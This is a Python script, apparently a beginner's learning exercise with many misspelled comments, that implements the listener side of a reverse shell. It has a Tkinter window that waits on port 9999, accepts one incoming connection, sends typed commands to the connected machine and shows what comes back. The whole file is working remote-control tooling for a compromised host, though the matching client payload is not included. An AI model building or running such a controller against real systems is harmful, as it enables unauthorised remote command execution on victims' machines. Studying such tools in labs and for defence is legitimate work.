#!/usr/bin/env python3

# What is this commantd? And why some phytons scripst start with it.

# Step 1: Creating a socket
# Step 2: Binding the socket and listening
# Step 3: Accepting connection
# Step 4: Sending command to the client
# Step 5: Client to server connection
# Step 6: Completing the client file

"""
Reverse shell Server with a GUI Interface
------------------------------------------
This server listents for an incoming reverse connection and provides a 
simple GUI (using Tkinter) to send commands and display outputs.
"""

# Import required modules
import socket                    # For networking (creating server socket)
import threading                 # For running network operation in background
import tkinter as tk             # GUI Library
from tkinter import scrolledtext
import sys                       # To exit on fatal errors

# Configuration
HOST = '' # Empty strings means listent to all avaliable interfaces (0.0.0.0)
PORT = 9999 # Poert number to listent for incoming connection

class ReverseShell:
    def __init__(self, master):
        self.master = master
        master.title('Reverse Shell controller') # Set windows title
        # Create a scrollable text area for displaying the output
        self.output_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=80, height=20)
        self.output_area.pack(padx=10, pady=10)
        # Create an input field for typing commands
        self.entry = tk.Entry(master, width=80)
        self.entry.pack(padx=10, pady=(0, 10))
        self.entry.bind("<Return>", self.send_command) # Send commands on pressingEnter
        # Create a Send button
        self.send_button = tk.Button(master, text="Send", command = self.send_command)
        self.send_button.pack(pady=(0, 10))

        # Create server socket using IPv4 (AF_INET) and TCP (SOCKET_STREAM)
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Bind socket to addres and port
            self.server_socket.bind((HOST, PORT))
            self.server_socket.listen(1) # Only allow one connection
            self.write_output(f"[!] Listening on {PORT}...\n")
        except socket.error as e:
            self.write_output(f"[!] Socket error: {e}\n")
            sys.exit(1) # Exit if socket set up fails

        self.conn = None # To hold the client socket
        self.addr = None # To hold the client address

        # Stert a thread to accept incoming connection without blocking the GUI
        threading.Thread(target=self.accept_connection, daemon=True).start()

    def write_output(self, message):
        """
        Display messages in the GUI text area and auto-scroll it.
        """
        self.output_area.insert(tk.END, message) # Append tedxt
        self.output_area.see(tk.END) # Auto-scroll

    def accept_connection(self):
        """
        Wait and accept an incoming connection from client
        """
        try:
            self.conn, self.addr = self.server_socket.accept() # Block until client connects
            self.write_output(f"[*] Connection strablished from {self.addr[0]}:{self.addr[1]}\n")
            #Start reciving data in the background
            threading.Thread(target=self.recive_data, daemon=True).start()
        except Exception as e:
            self.write_output(f"[!] Error accepting connection: {e}\n")
    
    def recive_data(self):
        """
        Continously recive and display data from the cliet
        """
        while True:
            try:
                data = self.conn.recv(4096) # Recive data from client
                if not data:
                    self.write_output(f"[*] Connection closed by the remote host.\n")
                    break
                decoded = data.decode("utf-8", errors="ignore")
                self.write_output(decoded)
            except Exception as e:
                self.write_output(f"[!] Error reciving data: {e}\n")
                break

    def send_command(self, even=None):
        """
        Send a command from user input fo the connected client
        """
        cmd = self.entry.get().strip()
        if cmd:
            try:
                self.conn.send(cmd.encode("utf-8")) # Send command to the client
                self.write_output(f"\n[>] {cmd}\n") # Show it in GUI
            except Exception as e:
                self.write_output(f"[!] Failed to send command: {e}\n")
            self.entry.delete(0, tk.END) #Clear input field

            if cmd.lower() == "quit": # Handle termination
                self.conn.close()
                self.server_socket.close()
                self.master.quit()
        
        else:
            self.write_output(f"[!] No client connected yet.\n")
    
# Main execution
if __name__ == '__main__':
    root = tk.Tk()
    gui = ReverseShell(root) # Start GUI
    root.mainloop() # Start 
